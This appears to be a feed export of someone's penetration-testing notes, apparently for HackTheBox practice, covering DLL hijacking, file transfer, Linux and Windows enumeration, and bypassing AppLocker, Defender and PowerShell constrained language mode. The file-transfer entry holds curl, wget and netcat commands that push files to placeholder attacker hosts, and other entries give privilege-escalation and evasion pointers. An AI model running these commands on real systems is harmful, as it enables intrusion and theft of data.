item.title: DLL-Hijacking
item.description: Some binaries that run in syswow64 and have elevated execuation. SystemPropertiesComputerName.exe SystemPropertiesHardware.exe SystemPropertiesProtection.exe SystemPropertiesRemote.exe This website will tell you the dll need for a bianry commonly found in windows most likel x86. https://lolbas-project.github.io/ tzsync /? set COR_ENABLE_PROFILING=1 set | findstr COR https://github.com/attl4s/pruebas/blob/master/Beryllium.dll

item.title: File Transfer
item.description: ######## LI/NUX ######### Python http server python3 -m http.server 9090 python -m simpleHTTPServer 9090 Curl upload = curl -F 'data=@home/Documents' IP_ADDRESS download = curl http://IP_ADDRESS -o file wget upload = wget --post-file user.txt http://IP_ADDRESS:PORT download = wget http://address:9090/filename NetCat File Transfer Netcat notice with this method , sender <, reciever >. -w wait, -l listener -p port upload = nc -w 3 [your_ip] 1337 < file.txt listener = nc -lp 1337 > file.

item.title: Linux Enumeration
item.description: I always start with nmap i use TCP Connect switch, then move to targeted scans. Then i run a full udp scan. While udp is being scanned. I will then move to gobuster, start manual enumeration. Things to look for are input fields of any kind, look for php parameters/actions in the source. nmap nmap -sT -p- -T5 -oA nmap/tcpconnect ipaddr nmap -sC -sV -T4 -pport,port,port -oA nmap/targeted ipaddr nmap -sU -p- -T5 -oA nmap/udp ipaddr Gobuster

item.title: Windows-Bypass
item.description: I have kept running in applocker and antivirus, and CLM (constrained language mode) I would like to cover some different ways to bypass these restrictions. CLM designed to make our job harder. Basically takes away allot methods and invoke. Which means we can’t just call powerview and run in it memory. you could still download it and bypass Defender with some kind of encoding/encryption. CLM uses umci policy to determine what powershell scripts are approved(whitelisted).

item.title: Windows_enum
item.description: Shell preferences nishang < nc < winrm / meterpreter change password inside powershell. $password = read-host "Su-ErD;perPa$sw0rd" -assecurestring $useraccount = get-localuser -name "pinkiepie" $useraccount | set-localuser -password $password os https://developer.microsoft.com/en-us/windows/downloads/virtual-machines next week minatoTW the creator of arkham and some other hackthebox challenges will be on if all goes well. The time will be moved to around to 12 pm
